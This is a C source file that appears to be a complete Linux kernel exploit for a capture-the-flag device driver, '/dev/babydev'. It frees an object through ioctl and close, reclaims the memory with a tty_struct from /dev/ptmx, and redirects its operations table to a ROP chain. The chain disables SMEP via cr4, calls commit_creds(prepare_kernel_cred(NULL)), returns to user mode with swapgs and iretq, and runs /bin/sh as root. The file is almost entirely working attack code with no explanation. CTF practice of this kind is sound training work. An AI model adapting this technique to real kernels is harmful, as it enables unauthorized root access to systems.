#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

const unsigned long long commit_creds = 0xffffffff810a1420, prepare_kernel_cred = 0xffffffff810a1810;
#define movcr4rdi_poprbp_ret 0xffffffff81004d80	// need to move 0x6f0 to cr4
#define swapgs_poprbp_ret 0xffffffff81063694
#define iretq 0xffffffff814e35ef
#define poprdi_ret 0xffffffff810d238d
#define movrsprax_decebx_ret 0xffffffff8181bfc5
#define poprax_ret 0xffffffff8100ce6e

unsigned long long fake_tty_operations[30];

void saveStatus();
void print_binary(char* buf, int length);
void rise_cred();
void shell();

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\n\033[0m");
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
	printf("---------------------------------------------------------------------------\n");
	printf("Address info starting in %p:\n", buf);
	int index = 0;
	char output_buffer[80];
	memset(output_buffer, '\0', 80);
	memset(output_buffer, ' ', 0x10);
	for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
		char temp_buffer[0x10];
		memset(temp_buffer, '\0', 0x10);
		sprintf(temp_buffer, "%#5x", index);
		strcpy(output_buffer, temp_buffer);
		output_buffer[5] = ' ';
		output_buffer[6] = '|';
		output_buffer[7] = ' ';
		for(int j=0; j<16; j++){
			if(index+j >= length)
				sprintf(output_buffer+8+3*j, "   ");
			else{
				sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
				if(!isprint(buf[index+j]))
					output_buffer[58+j] = '.';
				else
					output_buffer[58+j] = buf[index+j];
			}
		}
		output_buffer[55] = ' ';
		output_buffer[56] = '|';
		output_buffer[57] = ' ';
		printf("%s\n", output_buffer);
		memset(output_buffer+58, '\0', 16);
		index += 16;
	}
	printf("---------------------------------------------------------------------------\n");
}

void rise_cred(){
	// define two function pointer
	// printf("\033[32m\033[1m[+] Ready to execute commit_creds(prepare_kernel_cred(NULL))......\033[0m\n");
	void* (*prepare_kernel_credp)(void*) = prepare_kernel_cred;
	int (*commit_credsp)(void*) = commit_creds;
	(*commit_credsp)((*prepare_kernel_credp)(NULL));
	// printf("\033[32m\033[1m[+] commit_creds(prepare_kernel_cred(NULL)) executed.\033[0m\n");
}

void shell(){
	// if(getuid()){
	// 	printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
	// 	exit(1);
	// }
	// printf("\033[32m\033[1m[+] Congratulations! root got......\033[0m\n");
	system("/bin/sh");
	exit(0);
}

int main(){
	saveStatus();
	
	unsigned long long rop[0x20] = {0};
	int idx = 0;
	rop[idx++] = poprdi_ret;			// mov rdi, 6f0h
	rop[idx++] = 0x6f0;
	rop[idx++] = movcr4rdi_poprbp_ret;	// close SMEP
	rop[idx++] = 0;						// for pop rbp
	rop[idx++] = rise_cred;
	rop[idx++] = swapgs_poprbp_ret;		// ready to return to user mode
	rop[idx++] = 0;
	rop[idx++] = iretq;
	rop[idx++] = shell;
	rop[idx++] = user_cs;
	rop[idx++] = user_rflags;
	rop[idx++] = user_sp;
	rop[idx++] = user_ss;
	
	unsigned long long fake_tty_struct[0x20];

	for(int i=0; i<0x10; i++)
		fake_tty_operations[i] = movrsprax_decebx_ret;
	fake_tty_operations[0] = poprax_ret;
	fake_tty_operations[1] = (unsigned long long)rop;
		
	int f1 = open("/dev/babydev", 2);
	int f2 = open("/dev/babydev", 2);
	ioctl(f1, 0x10001, 0x2e0);
	close(f1);
	
	int f3 = open("/dev/ptmx", 2|O_NOCTTY);
	
	read(f2, fake_tty_struct, 0x20);
	// fake_tty_struct[0] = 0x5401;
	fake_tty_struct[3] = (unsigned long long)fake_tty_operations;		// change the tty_operations pointer to our fake pointer
	
	print_binary((char*)fake_tty_struct, 0x20);
	char buf[0x8] = {0};
	write(f2, fake_tty_struct, 0x20);
	
	write(f3, buf, 8);
	return 0;
}
